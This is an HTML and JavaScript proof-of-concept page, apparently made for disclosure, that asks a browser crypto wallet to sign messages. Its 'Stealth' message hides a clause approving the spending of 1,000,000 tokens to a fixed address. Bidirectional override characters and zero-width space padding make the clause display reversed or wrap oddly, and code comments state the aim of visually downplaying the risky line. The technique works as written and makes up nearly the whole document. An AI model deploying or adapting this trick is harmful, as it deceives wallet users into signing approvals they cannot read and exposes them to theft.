<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Misleading Signing Prompt via Unicode Controls</title>
<meta name="viewport" content="width=device-width, initial-scale=1" />
<style>
  :root { color-scheme: light dark; }
  body { font-family: system-ui, -apple-system, Segoe UI, Arial; padding: 24px; max-width: 820px; margin: auto; }
  h1 { margin: 0 0 8px; }
  textarea { width: 100%; height: 140px; margin-top: 8px; padding: 10px; }
  button { padding: 10px 16px; margin-top: 8px; font-weight: 700; cursor: pointer; }
  pre { background: #0f172a; color: #e5e7eb; padding: 12px; border-radius: 8px; overflow: auto; white-space: pre-wrap; }
  .row { display: grid; grid-template-columns: 1fr 1fr; gap: 16px; }
  .muted { opacity:.85; }
</style>
</head>
<body>
  <h1>Misleading Signing Prompt via Unicode Controls</h1>
  <div class="row">
    <div>
      <h3>Normal</h3>
      <textarea id="msgNormal">Login to Example dApp
Nonce: 12345
Session: 10 minutes
This is a benign message.</textarea>
      <button id="btnSignNormal">Sign Normal</button>
    </div>

    <div>
      <h3>Stealth</h3>
      <textarea id="msgStealth"></textarea>
      <button id="btnSignStealth">Sign Stealth</button>
    </div>
  </div>

  <h3>Output</h3>
  <pre id="log">(idle)</pre>

<script>
  const $ = id => document.getElementById(id);
  const log = (x)=> { $('log').textContent += (typeof x==='string'? x : JSON.stringify(x,null,2))+'\n'; };

  // Minimal controls for fewer artifacts
  const RLO = '\u202E'; // Right-to-Left Override
  const PDF = '\u202C'; // Pop Directional Formatting
  const ZWSP = '\u200B'; // Zero-width space

  // Risky clause we want to visually downplay:
  const risky = "I APPROVE SPENDING: 1,000,000 TOKENS to 0xA11ceBEEF0000000000000000000000000000000";

  // Wrap only the risky line with RLO...PDF so it appears reversed/disfluent.
  // Add a moderate ZWSP pad so on some UIs it wraps oddly rather than showing direction marks.
  const stealthMessage =
`Login to Example dApp
Nonce: 12345
Session: 10 minutes
${RLO}${risky}${PDF}${ZWSP.repeat(80)}
Note: For disclosure only â€” message contains bidi controls.`;

  $('msgStealth').value = stealthMessage;

  async function getFrom() {
    if (!window.ethereum) throw new Error('No wallet provider (window.ethereum)');
    const [from] = await ethereum.request({ method: 'eth_requestAccounts' });
    return from;
  }

  async function signPersonal(msg) {
    const from = await getFrom();
    const sig = await ethereum.request({
      method: 'personal_sign',
      params: [msg, from]
    });
    log({ from, preview: msg.slice(0,140), sig });
  }

  $('btnSignNormal').addEventListener('click', async ()=>{
    try { await signPersonal($('msgNormal').value); } catch(e){ log(e?.message||String(e)); }
  });
  $('btnSignStealth').addEventListener('click', async ()=>{
    try { await signPersonal($('msgStealth').value); } catch(e){ log(e?.message||String(e)); }
  });
</script>
</body>
</html>
